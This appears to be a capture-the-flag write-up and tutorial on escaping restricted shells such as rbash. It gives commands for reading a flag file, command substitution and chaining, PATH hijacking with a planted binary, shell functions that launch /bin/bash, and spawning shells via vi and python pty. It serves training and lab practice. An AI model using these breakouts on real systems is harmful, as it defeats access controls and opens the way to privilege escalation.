
1. check allowed commands
```bash
compgen -c
```

2. If it says just `bash` (instead of `rbash`), you’re **out!** 
```bash
echo $0
```

3. It will read the `flag.txt` file even in the restricted mode

```bash
echo $(<flag.txt)
```

## 🛡️ What is a Restricted Shell?

A **restricted shell** is a **locked-down terminal** — like a jail. You can type some commands, but not all. It blocks things like:

- Moving to other folders
- Running custom programs
- Changing settings
- Running commands from other directories

📌 **Why?** To stop users from breaking stuff or accessing sensitive parts of the system.

Examples:

- `rbash` (restricted bash)
- `rksh` (restricted Korn shell)
- `rzsh` (restricted Z shell)

## 🧠 Why Escape It?

Because if you're trapped in a restricted shell, you can't do **much at all**. No access to tools, no access to `/bin/bash`, and no way to escalate privileges — unless you **break out**.

## 🔓 How to Escape a Restricted Shell (Tricks & Techniques)

Here are the **main ways** people escape from restricted shells:

### 1. 🧨 **Command Injection**

If you're allowed to run a command like:
```bash
ls -l
```
You can try to **inject another command** using backticks:
```bash
ls -l `pwd`
```
This runs the `pwd` command and puts its result into `ls`, which may leak info or break the restrictions.

### 2. 🔄 **Command Substitution**

This is similar to command injection, but using `$()`:
```bash
ls -l $(pwd)
```
Both backticks ` ` and `$()` run a command **inside another command**.

### 3. ⛓️ **Command Chaining**

If the shell lets you run commands with **`;`**, you can do:

```bash
ls ; whoami
```
This runs two commands one after the other, even if one is restricted.

### 4. 🌍 **Environment Variables**

Sometimes you can **modify variables** like `PATH` to change what command gets run:
```bash
export PATH=/my/directory:$PATH
```

Now if the shell runs `ls`, it’ll use **your version** of `ls` (if you’ve placed a malicious one in `/my/directory`).

### 5. 🧩 **Shell Functions**

Some restricted shells allow you to define a fake function:
```bash
function getout() { /bin/bash; }
getout
```

If this works, boom — you’ve started a new unrestricted shell.

### 6. 🧵 **Run an Unrestricted Shell**

If you're allowed to run `vi`, `less`, `python`, or `bash`, try:
```bash
vi
:!bash
```
Or:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
These commands can **break you out** into a full shell if they're allowed.